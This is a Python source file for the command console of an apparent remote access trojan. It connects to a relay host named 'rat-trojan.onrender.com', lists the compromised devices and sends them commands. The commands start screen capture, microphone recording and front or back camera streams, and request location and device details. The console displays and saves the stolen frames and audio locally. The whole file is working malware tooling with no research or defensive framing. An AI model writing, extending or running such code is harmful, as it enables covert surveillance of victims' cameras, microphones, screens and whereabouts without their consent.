import asyncio
import json
import time
import uuid
from pathlib import Path
from datetime import datetime

import websockets
import cv2
import numpy as np


# ============================================================
# CONFIG
# ============================================================

RENDER_URL = (
    "wss://rat-trojan.onrender.com/ws"
)

PC_DEVICE_ID = "pc-main"

PAIRING_SECRET = "LAB-123456"

RECONNECT_DELAY = 5

CAMERA_SAVE_INTERVAL = 5.0


# ============================================================
# DIRECTORIES
# ============================================================

DATA_DIR = Path(
    "received_data"
)

SCREEN_DIR = (
    DATA_DIR / "screens"
)

CAMERA_DIR = (
    DATA_DIR / "camera"
)

AUDIO_DIR = (
    DATA_DIR / "audio"
)


SCREEN_DIR.mkdir(
    parents=True,
    exist_ok=True
)

CAMERA_DIR.mkdir(
    parents=True,
    exist_ok=True
)

AUDIO_DIR.mkdir(
    parents=True,
    exist_ok=True
)


# ============================================================
# GLOBAL STATE
# ============================================================

websocket = None

connected = False

registered = False

devices = {}

running = True

pending_binary_metadata = None


# ============================================================
# CAMERA STATE
# ============================================================

camera_streams = {}


# ============================================================
# SEND JSON
# ============================================================

async def send_json(
    data
):

    global websocket

    if (
        websocket is None
        or not connected
    ):

        print(
            "[ERROR] "
            "Not connected to Render"
        )

        return False

    try:

        await websocket.send(
            json.dumps(data)
        )

        return True

    except Exception as e:

        print(
            "[SEND ERROR]",
            e
        )

        return False


# ============================================================
# DEVICE LIST
# ============================================================

async def request_devices():

    if not registered:

        print(
            "[ERROR] "
            "PC is not registered"
        )

        return

    await send_json({
        "type":
            "list_devices"
    })


def print_devices():

    print()

    print(
        "=" * 70
    )

    print(
        "DEVICES"
    )

    print(
        "=" * 70
    )

    if not devices:

        print(
            "No devices known."
        )

    else:

        print(
            f"{'DEVICE ID':<28}"
            f"{'TYPE':<12}"
            f"{'STATUS':<12}"
        )

        print(
            "-" * 70
        )

        for device_id, device in devices.items():

            status = device.get(
                "status",
                "offline"
            )

            device_type = device.get(
                "device_type",
                "unknown"
            )

            print(
                f"{device_id:<28}"
                f"{device_type:<12}"
                f"{status:<12}"
            )

    print(
        "=" * 70
    )

    print()


def handle_device_list(
    data
):

    global devices

    devices = {}

    for device in data.get(
        "devices",
        []
    ):

        device_id = device.get(
            "device_id"
        )

        if not device_id:
            continue

        devices[
            device_id
        ] = device

    print_devices()


# ============================================================
# COMMAND
# ============================================================

async def send_command(
    device_id,
    command,
    args=None
):

    if args is None:
        args = {}

    command_id = (
        "cmd-" +
        uuid.uuid4().hex[:10]
    )

    message = {

        "type":
            "command",

        "device_id":
            device_id,

        "command_id":
            command_id,

        "command":
            command,

        "args":
            args
    }

    if await send_json(
        message
    ):

        print()

        print(
            f"[COMMAND] "
            f"{command}"
        )

        print(
            f"[TARGET]  "
            f"{device_id}"
        )

        print(
            f"[ID]      "
            f"{command_id}"
        )

        if args:

            print(
                f"[ARGS]    "
                f"{args}"
            )

        print()


# ============================================================
# DEVICE CONNECTED
# ============================================================

def handle_device_connected(
    data
):

    device_id = data.get(
        "device_id"
    )

    if not device_id:
        return

    devices[
        device_id
    ] = {

        "device_id":
            device_id,

        "device_type":
            data.get(
                "device_type",
                "unknown"
            ),

        "status":
            "online"
    }

    print()

    print(
        "=" * 70
    )

    print(
        "DEVICE CONNECTED"
    )

    print(
        "=" * 70
    )

    print(
        "ID     :",
        device_id
    )

    print(
        "TYPE   :",
        data.get(
            "device_type"
        )
    )

    print(
        "STATUS : ONLINE"
    )

    print(
        "=" * 70
    )

    print()


# ============================================================
# DEVICE DISCONNECTED
# ============================================================

def handle_device_disconnected(
    data
):

    device_id = data.get(
        "device_id"
    )

    if not device_id:
        return

    if device_id in devices:

        devices[
            device_id
        ][
            "status"
        ] = "offline"

    stop_local_camera(
        device_id
    )

    print()

    print(
        "[DEVICE OFFLINE]",
        device_id
    )

    print()


# ============================================================
# COMMAND RESPONSE
# ============================================================

def handle_command_response(
    data
):

    device_id = data.get(
        "device_id",
        "unknown"
    )

    command_id = data.get(
        "command_id",
        "unknown"
    )

    success = data.get(
        "success",
        True
    )

    result = data.get(
        "data"
    )

    print()

    print(
        "=" * 70
    )

    print(
        "COMMAND RESPONSE"
    )

    print(
        "=" * 70
    )

    print(
        "Device :",
        device_id
    )

    print(
        "Command:",
        command_id
    )

    print(
        "Success:",
        success
    )

    print()

    if isinstance(
        result,
        (dict, list)
    ):

        print(
            json.dumps(
                result,
                indent=4
            )
        )

    else:

        print(
            result
        )

    print(
        "=" * 70
    )

    print()


# ============================================================
# CAMERA
# ============================================================

def get_camera_state(
    device_id
):

    if device_id not in camera_streams:

        camera_streams[
            device_id
        ] = {

            "active":
                True,

            "last_frame":
                0.0,

            "last_saved":
                0.0,

            "frame_count":
                0,

            "window_name":
                f"JARVIS CAMERA - "
                f"{device_id}"
        }

    return camera_streams[
        device_id
    ]


def start_local_camera(
    device_id
):

    state = get_camera_state(
        device_id
    )

    state[
        "active"
    ] = True

    print(
        "[CAMERA] "
        f"Local stream enabled: "
        f"{device_id}"
    )


def stop_local_camera(
    device_id
):

    state = camera_streams.get(
        device_id
    )

    if state:

        state[
            "active"
        ] = False

        try:

            cv2.destroyWindow(
                state[
                    "window_name"
                ]
            )

        except Exception:
            pass

        camera_streams.pop(
            device_id,
            None
        )

    print(
        "[CAMERA] "
        f"Local stream stopped: "
        f"{device_id}"
    )


# ============================================================
# CAMERA FRAME
# ============================================================

def handle_camera_frame(
    metadata,
    binary_data
):

    device_id = metadata.get(
        "source_device_id"
    )

    if not device_id:

        device_id = metadata.get(
            "device_id",
            "unknown"
        )

    if device_id == "unknown":

        print(
            "[CAMERA] "
            "Frame without device ID"
        )

        return

    state = get_camera_state(
        device_id
    )

    if not state[
        "active"
    ]:

        return

    try:

        array = np.frombuffer(
            binary_data,
            dtype=np.uint8
        )

        frame = cv2.imdecode(
            array,
            cv2.IMREAD_COLOR
        )

        if frame is None:

            print(
                "[CAMERA] "
                "Invalid JPEG frame"
            )

            return

    except Exception as e:

        print(
            "[CAMERA] "
            "Decode error:",
            e
        )

        return

    now = time.monotonic()

    state[
        "last_frame"
    ] = now

    state[
        "frame_count"
    ] += 1

    try:

        cv2.imshow(
            state[
                "window_name"
            ],
            frame
        )

        cv2.waitKey(1)

    except Exception as e:

        print(
            "[CAMERA] "
            "Display error:",
            e
        )

    if (
        now -
        state["last_saved"]
        >= CAMERA_SAVE_INTERVAL
    ):

        save_camera_snapshot(
            device_id,
            frame
        )

        state[
            "last_saved"
        ] = now


def save_camera_snapshot(
    device_id,
    frame
):

    timestamp = (
        datetime.now()
        .strftime(
            "%Y%m%d_%H%M%S_%f"
        )[:-3]
    )

    filename = (
        CAMERA_DIR /
        f"{device_id}_{timestamp}.jpg"
    )

    try:

        success = cv2.imwrite(
            str(filename),
            frame
        )

        if success:

            print(
                "[CAMERA SNAPSHOT] "
                f"{device_id} "
                f"-> {filename}"
            )

        else:

            print(
                "[CAMERA] "
                f"Failed to save: "
                f"{filename}"
            )

    except Exception as e:

        print(
            "[CAMERA] "
            "Save error:",
            e
        )


# ============================================================
# SCREEN
# ============================================================

def handle_screen_data(
    metadata,
    binary_data
):

    device_id = metadata.get(
        "source_device_id"
    )

    if not device_id:

        device_id = metadata.get(
            "device_id",
            "unknown"
        )

    timestamp = int(
        time.time() * 1000
    )

    filename = (
        SCREEN_DIR /
        f"{device_id}_{timestamp}.jpg"
    )

    try:

        filename.write_bytes(
            binary_data
        )

        print(
            "[SCREEN] "
            f"{device_id} "
            f"{len(binary_data)} bytes "
            f"-> {filename}"
        )

    except Exception as e:

        print(
            "[SCREEN SAVE ERROR]",
            e
        )


# ============================================================
# MICROPHONE
# ============================================================

def handle_microphone_data(
    metadata,
    binary_data
):

    device_id = metadata.get(
        "source_device_id"
    )

    if not device_id:

        device_id = metadata.get(
            "device_id",
            "unknown"
        )

    timestamp = int(
        time.time() * 1000
    )

    filename = (
        AUDIO_DIR /
        f"{device_id}_{timestamp}.pcm"
    )

    try:

        filename.write_bytes(
            binary_data
        )

        print(
            "[MIC] "
            f"{device_id} "
            f"{len(binary_data)} bytes "
            f"-> {filename}"
        )

    except Exception as e:

        print(
            "[MIC SAVE ERROR]",
            e
        )


# ============================================================
# BINARY
# ============================================================

async def handle_binary_data(
    metadata,
    binary_data
):

    stream_type = metadata.get(
        "type"
    )

    packet_type = metadata.get(
        "packet_type"
    )

    if stream_type == (
        "camera_frame"
    ):

        handle_camera_frame(
            metadata,
            binary_data
        )

        return

    if stream_type == (
        "screen_frame"
    ):

        handle_screen_data(
            metadata,
            binary_data
        )

        return

    if stream_type == (
        "microphone_chunk"
    ):

        handle_microphone_data(
            metadata,
            binary_data
        )

        return

    # --------------------------------------------------------
    # Old protocol compatibility
    # --------------------------------------------------------

    if packet_type == 1:

        handle_screen_data(
            metadata,
            binary_data
        )

    elif packet_type == 2:

        handle_microphone_data(
            metadata,
            binary_data
        )

    elif packet_type == 3:

        handle_camera_frame(
            metadata,
            binary_data
        )

    else:

        print(
            "[BINARY] "
            f"Unknown stream type="
            f"{stream_type} "
            f"packet_type="
            f"{packet_type} "
            f"size="
            f"{len(binary_data)}"
        )


# ============================================================
# RECEIVER
# ============================================================

async def receiver_loop():

    global pending_binary_metadata

    pending_binary_metadata = None

    try:

        while connected:

            message = (
                await websocket.recv()
            )

            # =================================================
            # BINARY
            # =================================================

            if isinstance(
                message,
                bytes
            ):

                if not message:
                    continue

                if (
                    pending_binary_metadata
                ):

                    metadata = (
                        pending_binary_metadata
                    )

                    pending_binary_metadata = (
                        None
                    )

                    await handle_binary_data(
                        metadata,
                        message
                    )

                    continue

                print(
                    "[BINARY] "
                    "Received binary "
                    "without metadata"
                )

                continue

            # =================================================
            # TEXT
            # =================================================

            try:

                data = json.loads(
                    message
                )

            except json.JSONDecodeError:

                print(
                    "[INVALID JSON]",
                    message
                )

                continue

            message_type = data.get(
                "type"
            )

            # =================================================
            # STREAM METADATA
            # =================================================

            if message_type in (
                "camera_frame",
                "screen_frame",
                "microphone_chunk"
            ):

                pending_binary_metadata = (
                    data
                )

                continue

            # =================================================
            # DEVICES
            # =================================================

            if message_type == (
                "devices"
            ):

                handle_device_list(
                    data
                )

            # =================================================
            # CONNECTED
            # =================================================

            elif message_type in (
                "device_connected",
                "device_online"
            ):

                handle_device_connected(
                    data
                )

            # =================================================
            # DISCONNECTED
            # =================================================

            elif message_type in (
                "device_disconnected",
                "device_offline"
            ):

                handle_device_disconnected(
                    data
                )

            # =================================================
            # COMMAND RESPONSE
            # =================================================

            elif message_type == (
                "command_response"
            ):

                handle_command_response(
                    data
                )

            # =================================================
            # PC REGISTER
            # =================================================

            elif message_type == (
                "pc_register_response"
            ):

                if data.get(
                    "success"
                ):

                    print(
                        "[RENDER] "
                        "PC registered "
                        "successfully"
                    )

                else:

                    print(
                        "[RENDER] "
                        "PC registration "
                        "failed:",
                        data.get(
                            "message"
                        )
                    )

            # =================================================
            # HEARTBEAT
            # =================================================

            elif message_type == (
                "heartbeat_ack"
            ):

                pass

            # =================================================
            # PONG
            # =================================================

            elif message_type == (
                "pong"
            ):

                pass

            # =================================================
            # ERROR
            # =================================================

            elif message_type == (
                "error"
            ):

                print(
                    "[RENDER ERROR]",
                    data.get(
                        "message"
                    )
                )

            else:

                print(
                    "[RENDER]",
                    data
                )

    except websockets.ConnectionClosed:

        pass

    except asyncio.CancelledError:

        pass

    except Exception as e:

        print(
            "[RECEIVER ERROR]",
            e
        )


# ============================================================
# HEARTBEAT
# ============================================================

async def heartbeat_loop():

    while connected:

        try:

            await asyncio.sleep(
                10
            )

            if not connected:
                break

            await send_json({
                "type":
                    "heartbeat"
            })

        except asyncio.CancelledError:

            break

        except Exception as e:

            print(
                "[HEARTBEAT ERROR]",
                e
            )

            break


# ============================================================
# REGISTER
# ============================================================

async def register_pc():

    return await send_json({

        "type":
            "pc_register",

        "device_id":
            PC_DEVICE_ID,

        "device_type":
            "pc",

        "secret":
            PAIRING_SECRET
    })


# ============================================================
# CONNECTION
# ============================================================

async def connect_to_render():

    global websocket
    global connected
    global registered

    try:

        print()
        print(
            "[RENDER] Connecting..."
        )

        async with websockets.connect(

            RENDER_URL,

            ping_interval=20,

            ping_timeout=20

        ) as ws:

            websocket = ws

            connected = True

            registered = False

            print(
                "[RENDER] Connected"
            )

            await register_pc()

            # IMPORTANT:
            # We wait for pc_register_response.
            # receiver_loop will receive it.
            # For now the connection is alive.

            receiver_task = (
                asyncio.create_task(
                    receiver_loop()
                )
            )

            heartbeat_task = (
                asyncio.create_task(
                    heartbeat_loop()
                )
            )

            done, pending = (
                await asyncio.wait(
                    [
                        receiver_task,
                        heartbeat_task
                    ],
                    return_when=(
                        asyncio.FIRST_COMPLETED
                    )
                )
            )

            for task in pending:

                task.cancel()

    except Exception as e:

        print(
            "[RENDER CONNECTION ERROR]",
            e
        )

    finally:

        connected = False

        registered = False

        websocket = None

        for device_id in list(
            camera_streams.keys()
        ):

            stop_local_camera(
                device_id
            )

        print(
            "[RENDER] Disconnected"
        )


# ============================================================
# CLI
# ============================================================

async def controller_cli():

    global running
    global CAMERA_SAVE_INTERVAL

    print()

    print(
        "=" * 70
    )

    print(
        "             JARVIS CLOUD CONTROLLER"
    )

    print(
        "=" * 70
    )

    print(
        "Type 'help' for commands."
    )

    print()

    while running:

        try:

            line = await asyncio.to_thread(
                input,
                "JARVIS> "
            )

        except (
            EOFError,
            KeyboardInterrupt
        ):

            running = False
            return

        line = line.strip()

        if not line:
            continue

        parts = line.split()

        command = (
            parts[0].lower()
        )

        # ----------------------------------------------------
        # HELP
        # ----------------------------------------------------

        if command == "help":

            print()

            print(
                "devices"
            )

            print(
                "refresh"
            )

            print()

            print(
                "info <device_id>"
            )

            print(
                "battery <device_id>"
            )

            print(
                "status <device_id>"
            )

            print(
                "location <device_id>"
            )

            print()

            print(
                "screen-start <device_id>"
            )

            print(
                "screen-stop <device_id>"
            )

            print()

            print(
                "microphone-start <device_id>"
            )

            print(
                "microphone-stop <device_id>"
            )

            print()

            print(
                "camera-start <device_id>"
            )

            print(
                "camera-stop <device_id>"
            )

            print(
                "camera-front <device_id>"
            )

            print(
                "camera-back <device_id>"
            )

            print(
                "camera-switch <device_id>"
            )

            print()

            print(
                "camera-interval <seconds>"
            )

            print()

            print(
                "clear"
            )

            print(
                "exit"
            )

            print()

        # ----------------------------------------------------
        # DEVICES
        # ----------------------------------------------------

        elif command in (
            "devices",
            "refresh"
        ):

            await request_devices()

        # ----------------------------------------------------
        # INFO
        # ----------------------------------------------------

        elif command == "info":

            if len(parts) < 2:

                print(
                    "Usage: "
                    "info <device_id>"
                )

                continue

            await send_command(
                parts[1],
                "device_info"
            )

        # ----------------------------------------------------
        # BATTERY
        # ----------------------------------------------------

        elif command == "battery":

            if len(parts) < 2:

                print(
                    "Usage: "
                    "battery <device_id>"
                )

                continue

            await send_command(
                parts[1],
                "battery_status"
            )

        # ----------------------------------------------------
        # STATUS
        # ----------------------------------------------------

        elif command == "status":

            if len(parts) < 2:

                print(
                    "Usage: "
                    "status <device_id>"
                )

                continue

            await send_command(
                parts[1],
                "connection_status"
            )

        # ----------------------------------------------------
        # LOCATION
        # ----------------------------------------------------

        elif command == "location":

            if len(parts) < 2:

                print(
                    "Usage: "
                    "location <device_id>"
                )

                continue

            await send_command(
                parts[1],
                "location_request"
            )

        # ----------------------------------------------------
        # SCREEN
        # ----------------------------------------------------

        elif command == "screen-start":

            if len(parts) < 2:

                print(
                    "Usage: "
                    "screen-start <device_id>"
                )

                continue

            await send_command(
                parts[1],
                "start_screen"
            )

        elif command == "screen-stop":

            if len(parts) < 2:

                print(
                    "Usage: "
                    "screen-stop <device_id>"
                )

                continue

            await send_command(
                parts[1],
                "stop_screen"
            )

        # ----------------------------------------------------
        # MICROPHONE
        # ----------------------------------------------------

        elif command == "microphone-start":

            if len(parts) < 2:

                print(
                    "Usage: "
                    "microphone-start "
                    "<device_id>"
                )

                continue

            await send_command(
                parts[1],
                "start_microphone"
            )

        elif command == "microphone-stop":

            if len(parts) < 2:

                print(
                    "Usage: "
                    "microphone-stop "
                    "<device_id>"
                )

                continue

            await send_command(
                parts[1],
                "stop_microphone"
            )

        # ----------------------------------------------------
        # CAMERA
        # ----------------------------------------------------

        elif command == "camera-start":

            if len(parts) < 2:

                print(
                    "Usage: "
                    "camera-start "
                    "<device_id>"
                )

                continue

            device_id = parts[1]

            start_local_camera(
                device_id
            )

            await send_command(
                device_id,
                "start_camera"
            )

        elif command == "camera-stop":

            if len(parts) < 2:

                print(
                    "Usage: "
                    "camera-stop "
                    "<device_id>"
                )

                continue

            device_id = parts[1]

            await send_command(
                device_id,
                "stop_camera"
            )

            stop_local_camera(
                device_id
            )

        elif command == "camera-front":

            if len(parts) < 2:

                print(
                    "Usage: "
                    "camera-front "
                    "<device_id>"
                )

                continue

            await send_command(
                parts[1],
                "camera_front"
            )

        elif command == "camera-back":

            if len(parts) < 2:

                print(
                    "Usage: "
                    "camera-back "
                    "<device_id>"
                )

                continue

            await send_command(
                parts[1],
                "camera_back"
            )

        elif command == "camera-switch":

            if len(parts) < 2:

                print(
                    "Usage: "
                    "camera-switch "
                    "<device_id>"
                )

                continue

            await send_command(
                parts[1],
                "camera_switch"
            )

        # ----------------------------------------------------
        # CAMERA INTERVAL
        # ----------------------------------------------------

        elif command == (
            "camera-interval"
        ):

            if len(parts) != 2:

                print(
                    "Usage: "
                    "camera-interval "
                    "<seconds>"
                )

                continue

            try:

                interval = float(
                    parts[1]
                )

                if interval <= 0:
                    raise ValueError

                CAMERA_SAVE_INTERVAL = (
                    interval
                )

                print(
                    "[CAMERA] "
                    "Snapshot interval = "
                    f"{interval:.1f}s"
                )

            except ValueError:

                print(
                    "Invalid interval."
                )

        # ----------------------------------------------------
        # CLEAR
        # ----------------------------------------------------

        elif command == "clear":

            import os

            os.system(
                "cls"
                if os.name == "nt"
                else "clear"
            )

        # ----------------------------------------------------
        # EXIT
        # ----------------------------------------------------

        elif command == "exit":

            running = False

            print(
                "Stopping controller..."
            )

        else:

            print(
                f"Unknown command: "
                f"{command}"
            )


# ============================================================
# MAIN
# ============================================================

async def main():

    global running

    cli_task = asyncio.create_task(
        controller_cli()
    )

    while running:

        if not connected:

            await connect_to_render()

            if not running:
                break

            print(
                "[RENDER] "
                f"Reconnecting in "
                f"{RECONNECT_DELAY}s..."
            )

            await asyncio.sleep(
                RECONNECT_DELAY
            )

        else:

            await asyncio.sleep(
                1
            )

    if not cli_task.done():

        cli_task.cancel()

        try:

            await cli_task

        except asyncio.CancelledError:

            pass

    for device_id in list(
        camera_streams.keys()
    ):

        stop_local_camera(
            device_id
        )

    cv2.destroyAllWindows()


# ============================================================
# START
# ============================================================

if __name__ == "__main__":

    try:

        asyncio.run(
            main()
        )

    except KeyboardInterrupt:

        print()
        print(
            "Stopped."
        )